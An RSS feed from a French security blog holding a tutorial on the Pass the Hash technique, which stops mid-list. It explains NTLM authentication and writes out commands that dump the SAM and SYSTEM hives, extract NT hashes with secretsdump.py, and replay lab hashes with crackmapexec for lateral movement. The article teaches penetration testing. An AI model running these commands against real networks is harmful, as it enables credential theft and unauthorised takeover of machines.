<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>hackndo</title>
    <description>Ce blog est dédié à la sécurité informatique. Tutos sur les buffers overflow, l'Active Directory, on explique tout avec des exemples concrets.</description>
    <link>http://localhost:4000//</link>
    <atom:link href="http://localhost:4000//feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 18 Dec 2019 15:12:07 +0100</pubDate>
    <lastBuildDate>Wed, 18 Dec 2019 15:12:07 +0100</lastBuildDate>
    <generator>Jekyll v4.0.0</generator>
    
      <item>
        <title>Pass the Hash</title>
        <description>&lt;p&gt;Durant les tests d’intrusion internes, le mouvement latéral est une composante essentielle pour l’auditeur afin de chercher des informations en vue d’élever ses privilèges sur le système d’information. La technique dite du &lt;strong&gt;Pass the Hash&lt;/strong&gt; est extrêmement utilisée dans cette situation pour devenir administrateur sur un ensemble de machines. Nous allons détailler ici le fonctionnement de cette technique.&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;protocole-ntlm&quot;&gt;Protocole NTLM&lt;/h2&gt;

&lt;p&gt;Le protocole NTLM est un protocole d’authentification utilisé dans les environnement Microsoft. Il permet notamment à un utilisateur de prouver qui il est auprès d’un serveur pour pouvoir utiliser un service proposé par ce serveur.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Note : Dans cet article, le terme “serveur” est employé dans le sens client/serveur. Le “serveur” peut très bien être un poste de travail.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/09/NTLM_Basic.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/09/NTLM_Basic.png&quot; alt=&quot;NTLM&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Deux cas de figure peuvent se présenter :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Soit l’utilisateur utilise les identifiants d’un compte local du serveur, auquel cas le serveur possède le secret de l’utilisateur dans sa base locale et il pourra authentifier l’utilisateur;&lt;/li&gt;
  &lt;li&gt;Soit, dans un environnement Active Directory, l’utilisateur utilise un compte de domaine lors de l’authentification, et le serveur devra alors dialoguer avec le contrôleur de domaine pour vérifier les informations fournies par l’utilisateur.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Dans les deux cas, l’authentification commence par une phase de &lt;strong&gt;challenge/réponse&lt;/strong&gt; (ou stimulation/réponse) entre le client et le serveur.&lt;/p&gt;

&lt;h3 id=&quot;challenge---réponse&quot;&gt;Challenge - Réponse&lt;/h3&gt;

&lt;p&gt;Le principe du challenge/réponse est utilisé pour que le serveur vérifie que l’utilisateur connaisse le secret du compte avec lequel il s’authentifie, sans pour autant faire transiter le mot de passe sur le réseau. C’est ce qu’on appelle une &lt;a href=&quot;https://fr.wikipedia.org/wiki/Preuve_%C3%A0_divulgation_nulle_de_connaissance&quot;&gt;preuve à divulgation nulle de connaissance&lt;/a&gt;. Trois étapes composent cet échange :&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Négotiation&lt;/strong&gt; : Le client indique au serveur qu’il veut s’authentifier auprès de lui (&lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2&quot;&gt;NEGOTIATE_MESSAGE&lt;/a&gt;).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Challenge&lt;/strong&gt; : Le serveur envoie un challenge au client. Ce n’est rien d’autre qu’une valeur aléatoire de 64 bits qui change à chaque demande d’authentification (&lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/801a4681-8809-4be9-ab0d-61dcfe762786&quot;&gt;CHALLENGE_MESSAGE&lt;/a&gt;).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Réponse&lt;/strong&gt; : Le client chiffre le challenge précédemment reçu en utilisant une version hashée de son mot de passe comme clé, et renvoie cette version chiffrée au serveur, avec son nom d’utilisateur et éventuellement son domaine (&lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/033d32cc-88f9-4483-9bf2-b273055038ce&quot;&gt;AUTHENTICATE_MESSAGE&lt;/a&gt;).&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/09/NTLM_Challenge_Response.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/09/NTLM_Challenge_Response.png&quot; alt=&quot;NTLM Challenge Response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Voici une capture d’écran de mon lab. On voit que l’utilisateur &lt;strong&gt;Administrateur&lt;/strong&gt; tente de se connecter sur la machine &lt;strong&gt;LKAPP01.lion.king&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/ntlm_authentication_ws.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/ntlm_authentication_ws.png&quot; alt=&quot;NTLM Challenge Response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Les échanges NTLM sont encadrés en rouge en haut, et dans la partie basse se trouvent les informations contenues dans la réponse du serveur &lt;code class=&quot;highlighter-rouge&quot;&gt;CHALLENGE_MESSAGE&lt;/code&gt;. On y trouve notamment le challenge.&lt;/p&gt;

&lt;p&gt;Suite à ces échanges, le serveur est en possession de deux choses :&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Le challenge qu’il a envoyé au client&lt;/li&gt;
  &lt;li&gt;La réponse du client qui a été chiffrée avec son secret&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Pour finaliser l’authentification, il ne reste plus au serveur qu’à vérifier la validité de la réponse envoyée par le client. Mais juste avant ça, faisons un petit point sur le secret du client.&lt;/p&gt;

&lt;h3 id=&quot;secret-dauthentification&quot;&gt;Secret d’authentification&lt;/h3&gt;

&lt;p&gt;Nous avons dit que le client utilise comme clé une version hashée de son mot de passe, et ce pour la raison suivante : Eviter de stocker les mots de passe des utilisateurs en clair sur le serveur. C’est donc un condensat du mot de passe qui est enregistré à la place. Ce condensat est aujourd’hui le &lt;strong&gt;hash NT&lt;/strong&gt;, qui n’est rien d’autre que le résultat de la fonction &lt;a href=&quot;https://fr.wikipedia.org/wiki/MD4&quot;&gt;MD4&lt;/a&gt;, sans sel, rien.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashNT = MD4(password)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Donc pour résumer, lorsque le client s’authentifie, il utilise l’empreinte MD4 de son mot de passe pour chiffrer le challenge. Voyons alors ce qu’il se passe du côté du serveur, une fois cette réponse reçue.&lt;/p&gt;

&lt;h2 id=&quot;authentification&quot;&gt;Authentification&lt;/h2&gt;

&lt;p&gt;Comme expliqué tout à l’heure, il existe deux scénarios différents. Le premier est que le compte utilisé pour l’authentification est un compte local, c’est à dire que le serveur a connaissance de ce compte, et il a une copie du secret du compte. Le deuxième est qu’un compte de domaine est utilisé, auquel cas le serveur n’a pas connaissance de ce compte ou son secret. Il devra déléguer l’authentification au contrôleur de domaine.&lt;/p&gt;

&lt;h3 id=&quot;compte-local&quot;&gt;Compte local&lt;/h3&gt;

&lt;p&gt;Dans le cas où l’authentification se fait avec un compte local, le serveur va chiffrer le challenge qu’il a envoyé au client avec la clé secrète de l’utilisateur, ou plutôt avec le hash MD4 du secret de l’utilisateur. Il vérifiera ainsi si le résultat de son opération est égal à la réponse du client, prouvant que l’utilisateur possède le bon secret. Le cas contraire, la clé utilisée par l’utilisateur n’est pas la bonne puisque le chiffrement du challenge ne donne pas celui attendu.&lt;/p&gt;

&lt;p&gt;Pour pouvoir effectuer cette opération, le serveur a besoin de stocker les utilisateurs locaux et le condensat de leur secret. Le nom de cette base de donnée est la &lt;strong&gt;SAM&lt;/strong&gt; (Security Accounts Manager). La SAM peut être trouvée dans la base de registre, notamment avec l’outil &lt;code class=&quot;highlighter-rouge&quot;&gt;regedit&lt;/code&gt; mais uniquement lorsqu’on y accède en tant que &lt;strong&gt;SYSTEM&lt;/strong&gt;. On peut l’ouvrir en tant que &lt;strong&gt;SYSTEM&lt;/strong&gt; avec &lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/downloads/psexec&quot;&gt;psexec&lt;/a&gt; :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;psexec.exe -i -s regedit.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/SAM_registry.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/SAM_registry.png&quot; alt=&quot;SAM in registry&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Une copie se trouve également sur disque à l’emplacement &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\SAM&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Elle contient donc les utilisateurs locaux et le condensat de leur mot de passe, mais aussi la liste des groupes locaux. Enfin si on veut être précis, elle contient une version chiffrée des condensats. Mais comme toutes les informations pour les déchiffrer sont également dans la base de registres (SAM et SYSTEM), on peut faire le raccourci, et dire que c’est bien le condensat qui est stocké. Si vous voulez voir comment le déchiffrement fonctionne, vous pouvez aller voir &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py#L1124&quot;&gt;le code de secretsdump.py&lt;/a&gt; ou &lt;a href=&quot;https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c&quot;&gt;celui de Mimikatz&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;On peut d’ailleurs très bien sauvegarder les bases de données SAM et SYSTEM pour extraire la base des condensats des utilisateurs.&lt;/p&gt;

&lt;p&gt;D’abord on enregistre les deux bases de données dans un fichier&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reg.exe save hklm\sam save.save
reg.exe save hklm\system system.save
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ensuite, on peut utiliser &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py&quot;&gt;secretsdump.py&lt;/a&gt; pour extraire les hash&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;secretsdump.py &lt;span class=&quot;nt&quot;&gt;-sam&lt;/span&gt; sam.save &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; system.save LOCAL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/extract_nt_hashes.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/extract_nt_hashes.png&quot; alt=&quot;SAM verification&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Donc pour résumer, voici le processus de vérification.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/SAM_verification.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/SAM_verification.png&quot; alt=&quot;SAM verification&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Comme le serveur envoie un challenge (&lt;strong&gt;1&lt;/strong&gt;) et que le client chiffre ce challenge avec le hash de son secret puis le renvoie au serveur, avec son nom d’utilisateur (&lt;strong&gt;2&lt;/strong&gt;), le serveur va chercher le hash du mot de passe de l’utilisateur dans sa base SAM (&lt;strong&gt;3&lt;/strong&gt;). Une fois en possession de ce condensat, il va lui aussi chiffrer le challenge précédemment envoyé avec ce hash (&lt;strong&gt;4&lt;/strong&gt;), et il pourra ainsi confronter son résultat à celui renvoyé par l’utilisateur. Si c’est le même (&lt;strong&gt;5&lt;/strong&gt;) alors l’utilisateur est bien authentifié ! Le cas contraire, l’utilisateur n’a pas fourni le bon secret.&lt;/p&gt;

&lt;h3 id=&quot;compte-de-domaine&quot;&gt;Compte de domaine&lt;/h3&gt;

&lt;p&gt;Dans le cas où l’authentification se fait avec un compte du domaine, le hash NT de l’utilisateur n’est plus stocké sur le serveur, mais sur le contrôleur de domaine. Le serveur auprès duquel veut s’authentifier l’utilisateur reçoit alors la réponse à son challenge, mais il n’est pas en mesure de vérifier si cette réponse est valide. Il va déléguer cette tâche au contrôleur de domaine.&lt;/p&gt;

&lt;p&gt;Pour cela, il va utiliser le service &lt;strong&gt;Netlogon&lt;/strong&gt;, service qui est capable d’établir une connexion sécurisée avec le contrôleur de domaine. Cette connexion sécurisée s’appelle &lt;strong&gt;Secure Channel&lt;/strong&gt;. Elle est possible puisque le serveur possède son propre mot de passe, et le contrôleur de domaine connait le hash de ce mot de passe. Ils peuvent alors, de la même manière, effectuer un challenge/réponse pour s’échanger une clé de session et communiquer de manière sécurisée.&lt;/p&gt;

&lt;p&gt;Je ne vais pas rentrer dans les détails, mais l’idée est donc que le serveur va envoyer différents éléments au contrôleur de domaine dans une structure appelée &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/e17b03b8-c1d2-43a1-98db-cf8d05b9c6a8&quot;&gt;NETLOGON_NETWORK_INFO&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Le nom d’utilisateur du client (Identity)&lt;/li&gt;
  &lt;li&gt;Le challenge envoyé précédemment au client (LmChallenge)&lt;/li&gt;
  &lt;li&gt;La réponse au challenge envoyée par le client (NtChallengeResponse)&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Je ne parle pas de LmChallengeResponse puisque dans cet article, je m’intéresse seulement au hash NT, pas au hash LM qui est complètement obsolète.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Le contrôleur de domaine va chercher le hash NT de l’utilisateur dans sa base de données. Pour le contrôleur de domaine, ce n’est pas dans la SAM, puisque c’est un compte du domaine qui s’authentifie. Cette fois-ci c’est dans un fichier appelé &lt;strong&gt;NTDS.DIT&lt;/strong&gt;, qui est la base de données de tous les utilisateurs. Une fois le hash NT récupéré, il va calculer la réponse attendue avec ce hash et le challenge, et va confronter ce résultat à la réponse du client.&lt;/p&gt;

&lt;p&gt;Un message sera ensuite envoyé au serveur (&lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/bccfdba9-0c38-485e-b751-d4de1935781d&quot;&gt;NETLOGON_VALIDATION_SAM_INFO4&lt;/a&gt;) indiquant si oui ou non le client est authentifié, et il enverra également tout un tas d’informations concernant l’utilisateur. Ce sont d’ailleurs les mêmes informations que celles qu’on retrouve dans le &lt;a href=&quot;https://beta.hackndo.com/kerberos-silver-golden-tickets/#pac&quot;&gt;PAC&lt;/a&gt; lors d’une &lt;a href=&quot;https://beta.hackndo.com/kerberos/&quot;&gt;authentification Kerberos&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Donc pour résumer, voici le processus de vérification avec un contrôleur de domaine.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/DC_verification.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/DC_verification.png&quot; alt=&quot;SAM verification&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;De la même manière que tout à l’heure, le serveur envoie un challenge (&lt;strong&gt;1&lt;/strong&gt;) et le client chiffre ce challenge avec le hash de son secret puis le renvoie au serveur, accompagné de son nom d’utilisateur et le nom du domaine (&lt;strong&gt;2&lt;/strong&gt;). Cette fois-ci, le serveur va envoyer ces informations au contrôleur de domaine dans un &lt;strong&gt;Secure Channel&lt;/strong&gt; à l’aide du service &lt;strong&gt;Netlogon&lt;/strong&gt; (&lt;strong&gt;3&lt;/strong&gt;). Une fois en possession de ces informations, le contrôleur de domaine va lui aussi chiffrer le challenge en utilisant le hash de l’utilisateur, trouvé dans sa base de données (&lt;strong&gt;4&lt;/strong&gt;), et il pourra ainsi confronter son résultat à celui renvoyé par l’utilisateur. Si c’est le même (&lt;strong&gt;5&lt;/strong&gt;) alors l’utilisateur est bien authentifié. Le cas contraire, l’utilisateur n’a pas fourni le bon secret. Dans les deux cas, le contrôleur de domaine transmet l’information au serveur (&lt;strong&gt;6&lt;/strong&gt;).&lt;/p&gt;

&lt;h2 id=&quot;limites-du-hash-nt&quot;&gt;Limites du hash NT&lt;/h2&gt;

&lt;p&gt;Si vous avez bien suivi, vous aurez compris qu’en fait, le mot de passe en clair n’est jamais utilisé dans ces échanges, mais bien la version hashée du mot de passe, appelé hash NT. Ce hash est un condensat simple du mot de passe en clair.&lt;/p&gt;

&lt;p&gt;Donc en fait, si on y réfléchit bien, &lt;strong&gt;voler le mot de passe en clair ou voler le hash revient exactement au même&lt;/strong&gt;. Comme c’est le hash qui est utilisé pour répondre au challenge/réponse, être en possession du hash permet de s’authentifier auprès d’un serveur. Avoir le mot de passe en clair n’est absolument pas utile.&lt;/p&gt;

&lt;p&gt;Finalement, on peut même dire qu’&lt;strong&gt;avoir le hash NT revient à avoir le mot de passe en clair&lt;/strong&gt;, dans la majorité des cas.&lt;/p&gt;

&lt;h2 id=&quot;pass-the-hash&quot;&gt;Pass the Hash&lt;/h2&gt;

&lt;p&gt;On comprend donc bien que si un attaquant connait le hash NT d’un administrateur local d’une machine, il peut tout à fait s’authentifier auprès de cette machine en utilisant ce condensat. De la même manière, s’il possède le hash NT d’un utilisateur de domaine qui fait partie d’un groupe d’administration local d’une machine, il peut également s’authentifier auprès de cette machine en tant qu’administrateur local.&lt;/p&gt;

&lt;h3 id=&quot;administrateur-local-du-parc&quot;&gt;Administrateur local du parc&lt;/h3&gt;

&lt;p&gt;Maintenant, plaçons nous dans un environnement d’entreprise : Un nouveau collaborateur arrive, et un poste lui est fourni. Le département informatique ne s’amuse pas à installer et configurer depuis zéro un système Windows pour chaque collaborateur. Non, l’informaticien est paresseux, et s’il peut automatiser, il automatise.&lt;/p&gt;

&lt;p&gt;Ce qui est très courant est le scénario suivant : Une version du système Windows est installée et configurée pour répondre à tous les besoins de base d’un nouveau collaborateur. Cette version de base appelée &lt;strong&gt;master&lt;/strong&gt; est enregistrée dans un coin, et une copie de cette version est fournie à chaque nouvel arrivant.&lt;/p&gt;

&lt;p&gt;Cela implique que le compte administrateur local &lt;strong&gt;est le même&lt;/strong&gt; sur tous les postes qui ont bénéficié du même &lt;strong&gt;master&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Vous voyez où je veux en venir ? Si jamais un seul de ces postes est compromis et que l’attaquant extrait le hash NT de l’administrateur du poste, comme tous les autres postes ont le même compte d’admin avec le même mot de passe, et bien ils auront également le même hash NT. L’attaquant peut alors utiliser le hash trouvé sur le poste compromis et le rejouer sur tous les autres postes pour s’authentifier dessus.&lt;/p&gt;

&lt;p&gt;C’est ce qu’on appelle passer le hash, ou plus communément la technique du &lt;strong&gt;Pass the hash&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/pass-the-hash-schema.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/pass-the-hash-schema.png&quot; alt=&quot;Pass the hash&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Prenons un exemple, nous avons trouvé que le hash NT de l’utilisateur &lt;code class=&quot;highlighter-rouge&quot;&gt;Administrateur&lt;/code&gt; est &lt;code class=&quot;highlighter-rouge&quot;&gt;20cc650a5ac276a1cfc22fbc23beada1&lt;/code&gt;. Nous pouvons le rejouer sur une autre machine en espérant que cette machine ait été configurée de la même manière. Cet exemple utilise l’outil &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py&quot;&gt;psexec.py&lt;/a&gt; de la suite &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;Impacket&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/pass-the-hash-local.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/pass-the-hash-local.png&quot; alt=&quot;PTH Local&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bingo, ce hash fonctionne également sur la nouvelle machine, et nous avons la main dessus.&lt;/p&gt;

&lt;h3 id=&quot;compte-de-domaine-à-privilèges&quot;&gt;Compte de domaine à privilèges&lt;/h3&gt;

&lt;p&gt;Il existe une autre manière d’utiliser la technique du &lt;strong&gt;Pass the hash&lt;/strong&gt;. Imaginons que pour l’administration du parc à distance, il existe un groupe “HelpDesk” dans l’Active Directory. Pour que les membres de ce groupe puissent intervenir sur les machines des utilisateurs, le groupe est ajouté au groupe local “Administrateurs” de chaque machine. Ce groupe local contient les entités ayant les droits d’administration sur la machine.&lt;/p&gt;

&lt;p&gt;On peut d’ailleurs les lister avec la commande suivante&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Machine française&lt;/span&gt;
net localgroup Administrateurs

&lt;span class=&quot;c&quot;&gt;# ~Reste du monde&lt;/span&gt;
net localgroup Administrators
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On obtiendra alors un résultat comme celui-ci :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nom alias       Administrateur
Commentaire     Les membres du groupe Administrateurs disposent d'un accès complet et illimité à l'ordinateur et au domaine

Membres

-------------------------
Administrateur
ADSEC\Admins du domaine
ADSEC\HelpDesk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous avons donc le groupe du domaine &lt;code class=&quot;highlighter-rouge&quot;&gt;ADSEC\HelpDesk&lt;/code&gt; qui fait partie des administrateurs de la machine. Si jamais un attaquant vole le hash NT d’un des membres de ce groupe, il peut tout à fait demander à s’authentifier sur les machines ayant &lt;code class=&quot;highlighter-rouge&quot;&gt;ADSEC\HelpDesk&lt;/code&gt; dans la liste des administrateurs.&lt;/p&gt;

&lt;p&gt;L’avantage par rapport au compte local, c’est que quelque soit le master utilisé pour mettre en place les machines, le groupe sera ajouté par &lt;a href=&quot;/gpo-abuse-with-edit-settings/#group-policy-object&quot;&gt;GPO&lt;/a&gt; à la configuration de la machine. Les chances sont plus grandes pour que ce compte ait des droits d’administration plus étendus, indépendamment des OS et des mises en service des machines.&lt;/p&gt;

&lt;p&gt;Lors de la demande d’authentification, le serveur va donc déléguer l’authentification au contrôleur de domaine, et si l’authentification réussit, alors le contrôleur de domaine va envoyer au serveur des informations sur l’utilisateur telles que son nom, &lt;strong&gt;la liste des groupes auxquels il appartient&lt;/strong&gt;, la date d’expiration de son mot de passe etc.&lt;/p&gt;

&lt;p&gt;Le serveur va donc savoir que l’utilisateur fait partie du groupe &lt;strong&gt;HelpDesk&lt;/strong&gt;, et lui donnera un accès administrateur.&lt;/p&gt;

&lt;p&gt;Prenons un nouvel exemple, nous avons trouvé que le hash NT de l’utilisateur &lt;code class=&quot;highlighter-rouge&quot;&gt;jsnow&lt;/code&gt; est &lt;code class=&quot;highlighter-rouge&quot;&gt;89db9cd74150fc8d8559c3c19768ca3f&lt;/code&gt;. Ce compte fait partie du groupe &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDesk&lt;/code&gt; qui est administrateur local de toutes les machines du parc. Rejouons alors son hash sur une autre machine.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/pass-the-hash-domain.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/pass-the-hash-domain.png&quot; alt=&quot;PTH Domain&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;De la même manière, l’authentification a fonctionné et nous sommes administrateur de la cible.&lt;/p&gt;

&lt;h2 id=&quot;automatisation&quot;&gt;Automatisation&lt;/h2&gt;

&lt;p&gt;Maintenant que nous avons compris le fonctionnement de l’authentification NTLM, et pourquoi un hash NT pouvait être utilisé pour s’authentifier auprès d’autres machines, il serait utile de pouvoir automatiser la connexion sur les différentes cibles pour récupérer autant d’informations que possible en parallélisant les tâches.&lt;/p&gt;

&lt;p&gt;Pour cela, l’outil &lt;a href=&quot;https://github.com/byt3bl33d3r/CrackMapExec&quot;&gt;CrackMapExec&lt;/a&gt; est idéal. Il prend en entrée une liste de machines cibles, des identifiants, avec un mot de passe en clair ou un hash NT, et il peut exécuter des commandes sur les cibles pour lesquelles l’authentification a fonctionné.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Compte local d'administration&lt;/span&gt;
crackmapexec smb &lt;span class=&quot;nt&quot;&gt;--local-auth&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrateur &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 20cc650a5ac276a1cfc22fbc23beada1 10.10.0.1 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# Compte de domaine&lt;/span&gt;
crackmapexec smb &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; jsnow &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 89db9cd74150fc8d8559c3c19768ca3f &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; adsec.local  10.10.0.1 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Voici un exemple dans lequel l’utilisateur &lt;code class=&quot;highlighter-rouge&quot;&gt;simba&lt;/code&gt; est administrateur de tous les postes de travail.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/crackmapexec.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/crackmapexec.png&quot; alt=&quot;SAM verification&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Le Pass the hash a été effectué sur quelques machines qui sont alors compromises. Un argument a été passé à CrackMapExec pour énumérer les utilisateurs actuellement connectés sur ces machines.&lt;/p&gt;

&lt;p&gt;Avoir la liste des utilisateurs connectés, c’est bien, mais avoir leur mot de passe ou leur hash NT (ce qui est pareil), c’est mieux ! Pour ça, j’ai développé l’outil &lt;a href=&quot;https://github.com/hackndo/lsassy&quot;&gt;lsassy&lt;/a&gt; dont je parle dans l’article &lt;a href=&quot;/remote-lsass-dump-passwords/#nouveaux-outils&quot;&gt;Extraction des secrets de lsass à distance&lt;/a&gt;. Et en pratique, et bien ça donne ça :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/crackmapexec_lsassy.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/crackmapexec_lsassy.png&quot; alt=&quot;Lsassy verification&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Nous récupérons tous les hash NT des utilisateurs connectés. Ceux des comptes machine ne sont pas affichés puisque nous sommes déjà administrateur de ces machines, ils ne nous sont donc pas utiles.&lt;/p&gt;

&lt;h2 id=&quot;limites-du-pass-the-hash&quot;&gt;Limites du Pass the hash&lt;/h2&gt;

&lt;p&gt;Le Pass the hash est une technique qui fonctionne toujours lorsque l’authentification NTLM est acceptée par le serveur. Cependant, il existe des méchanismes dans Windows qui limitent ou peuvent limiter les actions d’administration.&lt;/p&gt;

&lt;p&gt;En effet, sur Windows, la gestion des droits est effectuée à l’aide de jetons de sécurité (&lt;em&gt;Access tokens&lt;/em&gt;) qui permettent de savoir qui a le droit de faire quoi. Les membres du groupe “Administrateurs” possèdent deux tokens. Un avec les droits d’un utilisateur standard, et un autre avec les droits administrateur. Par défaut, lorsqu’un administrateur exécute une tâche, elle est effectuée dans le contexte limité, standard. Si en revanche des actions d’administration doivent être exécutées, alors Windows affiche cette fenêtre très connue appelée &lt;strong&gt;UAC&lt;/strong&gt; (&lt;em&gt;User Account Control&lt;/em&gt; ou Contrôle de Compte Utilisateur)&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/11/uac_prompt.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/11/uac_prompt.png&quot; alt=&quot;Lsassy verification&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;L’utilisateur est averti que les droits d’administration sont demandés par l’application.&lt;/p&gt;

&lt;p&gt;Quid alors des actions d’administration effectuées à distance ? Et bien deux cas sont possibles.&lt;/p&gt;

&lt;ul&gt;
